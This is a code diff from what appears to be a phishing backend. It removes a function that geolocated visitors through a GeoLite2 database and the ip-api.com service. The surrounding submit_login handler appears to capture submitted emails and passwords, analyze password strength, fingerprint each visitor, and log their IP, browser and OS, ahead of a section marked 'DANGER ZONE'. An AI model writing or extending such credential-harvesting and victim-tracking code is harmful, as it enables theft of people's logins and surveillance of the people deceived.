@@ -13,7 +13,6 @@ import psutil
 import requests
 import logging
 from user_agents import parse
-import geoip2.database
 from urllib.parse import urlparse
 import time
 import threading
@@ -47,9 +46,6 @@ for directory in [LOG_DIR, ANALYTICS_DIR, SESSION_DIR, IP_DIR]:
 if not os.path.exists(LOG_FILE):
     with open(LOG_FILE, 'w') as f:
         f.write(f"--- Log Started at {datetime.datetime.now().isoformat()} ---\n")
-
-# Initialize GeoIP reader
-geo_reader = geoip2.database.Reader('GeoLite2-City.mmdb')
 
 # Statistics tracking
 stats = {
@@ -96,43 +92,6 @@ def get_client_fingerprint():
     # Create a fingerprint from available headers
     fingerprint_data = f"{user_agent}|{accept_lang}|{accept_encoding}"
     return hashlib.sha256(fingerprint_data.encode()).hexdigest()
-
-def get_geolocation(ip):
-    """Get geolocation data for an IP address"""
-    try:
-        # Try GeoLite2 database first
-        geo_match = geo_reader.city(ip)
-        print("Debug", geo_match)
-        if geo_match:
-            return {
-                "country": geo_match.country.name or 'Unknown',
-                "city": geo_match.city.name or 'Unknown',
-                "latitude": geo_match.location.latitude or 0,
-                "longitude": geo_match.location.longitude or 0,
-                "accuracy_radius": geo_match.location.accuracy_radius or 0,
-                "timezone": geo_match.location.time_zone or 'Unknown'
-            }
-        
-        # Fallback to IP-API for more accurate results (if this is just for educational purposes)
-        # In a real application, you would use a paid API with proper attribution
-        if ip != '127.0.0.1' and ip != 'localhost':
-            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
-            if response.status_code == 200:
-                data = response.json()
-                return {
-                    "country": data.get('country', 'Unknown'),
-                    "city": data.get('city', 'Unknown'),
-                    "latitude": data.get('lat', 0),
-                    "longitude": data.get('lon', 0),
-                    "timezone": data.get('timezone', 'Unknown'),
-                    "isp": data.get('isp', 'Unknown'),
-                    "org": data.get('org', 'Unknown'),
-                    "as": data.get('as', 'Unknown')
-                }
-    except Exception as e:
-        logger.error(f"Error getting geolocation: {e}")
-    
-    return {"country": "Unknown", "city": "Unknown"}
 
 def analyze_password(password):
     """Analyze password strength and characteristics"""
@@ -371,7 +330,7 @@ def submit_login():
         email = email.group(0) if email else "Not found"
         
         # Get geolocation data
-        geolocation = get_geolocation(ip_address)
+        # geolocation = get_geolocation(ip_address)
         
         # Get client fingerprint
         fingerprint = get_client_fingerprint()
@@ -419,7 +378,6 @@ def submit_login():
                 "session_token": session_token,
                 "first_visit": first_visit,
                 "time_on_page": time_on_page,
-                "geolocation": geolocation,
                 "fingerprint": fingerprint,
                 "referrer": referrer,
                 "referrer_domain": urlparse(referrer).netloc if referrer != 'Unknown' else 'Unknown',
@@ -449,7 +407,6 @@ def submit_login():
         logger.info(f"IP Address: {ip_address}")
         logger.info(f"Browser: {browser}")
         logger.info(f"OS: {os_info}")
-        logger.info(f"Country: {geolocation.get('country', 'Unknown')}")
         logger.info(f"---------------------------")
 
         # --- !!! DANGER ZONE !!! ---
